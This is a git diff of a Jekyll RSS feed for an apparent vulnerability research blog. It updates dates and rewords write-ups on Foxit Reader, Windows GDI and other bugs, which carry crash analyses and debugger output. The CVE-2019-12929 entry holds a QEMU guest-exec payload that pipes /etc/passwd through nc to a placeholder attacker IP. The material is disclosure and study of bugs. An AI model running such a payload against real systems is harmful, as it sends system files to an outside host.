@@ -5,15 +5,15 @@
     <description>A fan of sofware bugs and vulnerabilities.</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>2020-05-25</pubDate>
-    <lastBuildDate>Mon, 25 May 2020 16:37:34 +0000</lastBuildDate>
+    <pubDate>2020-06-03</pubDate>
+    <lastBuildDate>Wed, 03 Jun 2020 06:36:58 +0000</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
     
       <item>
-        <title>Foxit Reader 10 - NULL Pointer Dereference</title>
+        <title>Foxit Reader 10 - NULL Pointer Dereference Remote Code Execution</title>
         <description>&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
 
-&lt;p&gt;A &lt;strong&gt;NULL Pointer Dereference&lt;/strong&gt; can be triggered when opening a specially crafted PDF file using &lt;strong&gt;Foxit Reader&lt;/strong&gt; version 10.0.0.35798. The vulnerability was caused by an unchecked NULL pointer in &lt;strong&gt;FoxitReader!safe_vsnprintf&lt;/strong&gt; function which could leads to a process termination or a denial of service.&lt;/p&gt;
+&lt;p&gt;A &lt;strong&gt;NULL Pointer Dereference&lt;/strong&gt; can be triggered by opening a specially crafted PDF file using &lt;strong&gt;Foxit Reader&lt;/strong&gt; version 10.0.0.35798. The issue was caused by an unchecked pointer in &lt;strong&gt;FoxitReader!safe_vsnprintf&lt;/strong&gt; function. An attacker can trigger a read from address zero which could leads to a code execution or a denial of service.&lt;/p&gt;
 
 &lt;h1 id=&quot;crash-analysis&quot;&gt;Crash Analysis&lt;/h1&gt;
 
@@ -43,6 +43,8 @@ FoxitReader!safe_vsnprintf+0x9c4ffe:
 027fed2b 51              push    ecx
 027fed2c 6a00            push    0
 027fed2e 8b10            mov     edx,dword ptr [eax]  ds:002b:00000000=????????
+0216ed30 8bc8            mov     ecx,eax
+0216ed32 ff5208          call    dword ptr [edx+8]
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eax&lt;/code&gt; was a returned value from a call to a function pointer. The function was referenced at a fixed memory address which is &lt;strong&gt;0x04372174&lt;/strong&gt;.&lt;/p&gt;
@@ -95,7 +97,7 @@ FoxitReader!safe_vsnprintf+0x9c4ffe:
 0281d465 c20400          ret     4
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;There is a small possibility to gain control of the memory address at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;edx+10h&lt;/code&gt; by manipulating the allocated heap but I have not found any tricks to do that yet. So I will just leave it here for the readers.&lt;/p&gt;
+&lt;p&gt;There is also a small possibility to gain control of the memory address at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;edx+10h&lt;/code&gt; by manipulating the allocated heap but I have not found any tricks to do that yet. So I will just leave it here for the readers.&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:000&amp;gt; !heap -p -a eax
     address 2f448fc0 found in
@@ -137,7 +139,7 @@ FoxitReader!safe_vsnprintf+0x9c4ffe:
     0369a6f4 FoxitReader!CFXJSE_Arguments::GetValue+0x00d27824
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
-        <pubDate>2020-05-25</pubDate>
+        <pubDate>2020-06-03</pubDate>
         <link>http://localhost:4000/articles/2020-05/foxit_reader_10_null_deref</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-05/foxit_reader_10_null_deref</guid>
         
@@ -152,7 +154,7 @@ FoxitReader!safe_vsnprintf+0x9c4ffe:
         <title>Windows GDI SetEnhMetaFileBits - Out-of-Bounds Read</title>
         <description>&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
 
-&lt;p&gt;One of my fuzzing harness triggered a crash in &lt;strong&gt;GDI32!SetEnhMetaFileBits&lt;/strong&gt; function which can be turned to a vulnerability. The crash happens when it tries to copy a user-controlled data to a local dynamically allocated memory space. However, due to the lack of memory initialization the allocated buffer is left unfilled and allowed the attacker to leverage it to achieve &lt;strong&gt;Information Leakage&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;An &lt;strong&gt;Out-of-Bounds Read&lt;/strong&gt; can triggered by running a specially crafted program. The issue was caused by a lack of bounds check and initialization in the &lt;strong&gt;GDI32!SetEnhMetaFileBits&lt;/strong&gt; function. An attacker can trigger an uninitialized memory read within the allocated address.&lt;/p&gt;
 
 &lt;h1 id=&quot;crash-analysis&quot;&gt;Crash Analysis&lt;/h1&gt;
 
@@ -250,7 +252,7 @@ ntdll!memcpy+0x213:
 08 00d7f8c8 00000000 009c1353 7f1c5000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
-        <pubDate>2020-05-25</pubDate>
+        <pubDate>2020-06-03</pubDate>
         <link>http://localhost:4000/articles/2020-05/microsoft_windows_gdi32_setenhmetafilebits</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-05/microsoft_windows_gdi32_setenhmetafilebits</guid>
         
@@ -299,7 +301,7 @@ ntdll!memcpy+0x213:
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-25</pubDate>
+        <pubDate>2020-06-03</pubDate>
         <link>http://localhost:4000/articles/2020-04/suricata_stack_based_overflow</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-04/suricata_stack_based_overflow</guid>
         
@@ -367,7 +369,7 @@ ntdll!memcpy+0x213:
 
 &lt;p&gt;Going down the rabbit hole right before the data is insert into the hash table through &lt;strong&gt;emu_hashtable_insert&lt;/strong&gt; at line 70. &lt;strong&gt;emu_hashtable_search&lt;/strong&gt; is called to check whether the data is already inserted or not. At line 96, the address of the key inside the hash table will be divided with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eh-&amp;gt;size&lt;/code&gt; and triggers the bug.&lt;/p&gt;
 </description>
-        <pubDate>2020-05-25</pubDate>
+        <pubDate>2020-06-03</pubDate>
         <link>http://localhost:4000/articles/2020-03/libemu_divide_by_zero</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2020-03/libemu_divide_by_zero</guid>
         
@@ -488,7 +490,7 @@ diff --git a/mo&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dules&lt;/span&gt;&l
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-25</pubDate>
+        <pubDate>2020-06-03</pubDate>
         <link>http://localhost:4000/articles/2019-08/ipv6_neighbor_router_advertisement</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-08/ipv6_neighbor_router_advertisement</guid>
         
@@ -589,7 +591,7 @@ gs_base 0x0 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-25</pubDate>
+        <pubDate>2020-06-03</pubDate>
         <link>http://localhost:4000/articles/2019-08/bhyve_fbuf_null_deref</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-08/bhyve_fbuf_null_deref</guid>
         
@@ -644,7 +646,7 @@ gs_base 0x0 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;corrupt stack?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
-        <pubDate>2020-05-25</pubDate>
+        <pubDate>2020-06-03</pubDate>
         <link>http://localhost:4000/articles/2019-07/CVE-2019-13614</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-07/CVE-2019-13614</guid>
         
@@ -709,7 +711,7 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-25</pubDate>
+        <pubDate>2020-06-03</pubDate>
         <link>http://localhost:4000/articles/2019-07/CVE-2019-13613</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-07/CVE-2019-13613</guid>
         
@@ -2083,7 +2085,7 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
   &lt;/ol&gt;
 &lt;/div&gt;
 </description>
-        <pubDate>2020-05-25</pubDate>
+        <pubDate>2020-06-03</pubDate>
         <link>http://localhost:4000/articles/2019-06/bhyve_hda_bof</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-06/bhyve_hda_bof</guid>
         
@@ -2106,7 +2108,7 @@ Backtrace stopped: previous frame identical to this frame &lt;span class=&quot;o
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'execute':'guest-exec'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'arguments':&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'path':'/bin/bash'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'arg':&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'-c'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'cat&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/etc/passwd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;attacker_ip&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9999&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
-        <pubDate>2020-05-25</pubDate>
+        <pubDate>2020-06-03</pubDate>
         <link>http://localhost:4000/articles/2019-06/CVE-2019-12929</link>
         <guid isPermaLink="true">http://localhost:4000/articles/2019-06/CVE-2019-12929</guid>
         
